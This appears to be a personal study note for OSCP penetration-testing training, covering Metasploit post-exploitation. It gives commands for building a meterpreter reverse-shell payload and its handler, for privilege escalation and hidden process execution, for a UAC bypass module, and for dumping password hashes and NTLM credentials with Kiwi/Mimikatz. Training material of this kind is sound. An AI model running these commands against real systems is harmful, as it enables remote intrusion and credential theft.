---
aliases:
  - Metasploit Post Exploitation
tags:
  - tech
  - cybsec
  - offensive_security
  - offsec
  - oscp
  - metasploit
  - post_exploitation
  - meterpreter
author: Mehdi N Tehrani
creat_date: 2024-01-04
category: Cyber Security
subcategory: Offensive Security - OSCP
---


# Process
1. Build payload
```sh
msfvenom -p windows/x64/meterpreter_reverse_https LHOST=<lhost> LPORT=<lport> -f exe -o met.exe
```
2. Use multi/handler module in metasploit
```msfconsole
use multi/handler
set payload windows/x64/meterpreter_reverse_https
set lport <lport>
set lhost <lhost>
run
```

## meterpreter shell
#meterpreter 
```meterpreter
idletime     # how long user has been idle
getuid       # equiv to whoami
getsystem    # elevate to system account
ps
shell
getenv <env_name>
bg           # set session into background
hashdump
screenshare
```
### migrate meterpreter shell into an existing process
#migrate
We should note that we are only able to migrate into processes that execute at the same (or lower) [integrity and privilege level](https://docs.microsoft.com/en-us/windows/win32/secauthz/mandatory-integrity-control) than that of our current process.
```meterpreter
migrate <pid>   
```
### run new process
```meterpreter
execute -H -f <command_or_program_to_run>
         ^ hidden
```


# Bypass UAC
#uac #bypass_uac #bypass
[How UAC works](https://learn.microsoft.com/en-us/windows/security/application-security/application-control/user-account-control/how-it-works)
[Windows Object Manager](https://en.wikipedia.org/wiki/Object_Manager_(Windows))
[NtObjectManager Install](https://www.powershellgallery.com/packages/NtObjectManager/)
#nt_object_manager #ntobjectmanager #powershell_module #get_nttokenintegritylevel #nt_token #integrity_level
Find out the user's [integrity level](https://learn.microsoft.com/en-us/windows/win32/secauthz/mandatory-integrity-control): System, High, Medium, Low
```cmd
powershell -ep bypass
```
```powershell
Import-Module NtObjectManager
Get-NtTokenIntegrityLevel

Medium
```

## Bypass UAC using metasploit
1. This requires a meterpreter session already established
```meterpreter
search UAC
use exploit/windows/local/bypassuac_sdclt
set session <session_id>
```

2. Check user integrity level again:
```powershell
Get-NtTokenIntegrityLevel

High
```

# Kiwi
#kiwi #mimikatz 
Kiwi is a Meterpreter extension providing the capabilities of *Mimikatz*.
```meterpreter
load kiwi
```
## creds_msv 
#creds_msv #ntlm #lm 
to retrieve LM and NTLM credentials.
```meterpreter
creds_msv
```
